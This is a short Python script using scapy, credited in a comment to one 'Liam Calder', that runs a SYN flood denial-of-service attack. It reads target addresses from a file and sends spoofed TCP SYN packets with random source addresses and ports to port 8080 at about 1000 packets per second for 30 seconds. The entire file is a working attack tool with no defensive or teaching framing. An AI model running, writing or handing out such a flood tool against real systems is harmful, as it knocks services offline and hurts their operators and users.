from scapy.all import IP, TCP, send
import random
import time
import sys

# Liam Calder

# Read target IPs from a file (one per line)
with open('targets.txt', 'r') as f:
    target_ips = [line.strip() for line in f if line.strip()]

# Use the first target IP from the file (you can modify this to select a different one)
if not target_ips:
    print("No target IP found in targets.txt")
    sys.exit(1)

TARGET_IP = target_ips[0]
TARGET_PORT = 8080
DURATION = 30  # Duration of the attack in seconds
PACKET_RATE = 1000  # Packets per second
current_time = time.time()

print(f"Starting SYN flood attack on {TARGET_IP}:{TARGET_PORT}")
print(f"Attack started at {time.strftime('%H:%M:%S', time.localtime(current_time))}.")
print(f"Duration: {DURATION} seconds")
print(f"Packet rate: {PACKET_RATE} packets/second")

end_time = time.time() + DURATION

try:
    while time.time() < end_time:
        # Randomize source IP and port
        src_ip = f"192.168.1.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)
        ip = IP(src=src_ip, dst=TARGET_IP)
        tcp = TCP(sport=src_port, dport=TARGET_PORT, flags='S', seq=1000)
        pkt = ip / tcp
        send(pkt, verbose=0)
        # Control packet rate
        time.sleep(1 / PACKET_RATE)
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
    sys.exit(0)

print("SYN flood completed.")
print(f"Attack ended at {time.strftime('%H:%M:%S', time.localtime(end_time))}.")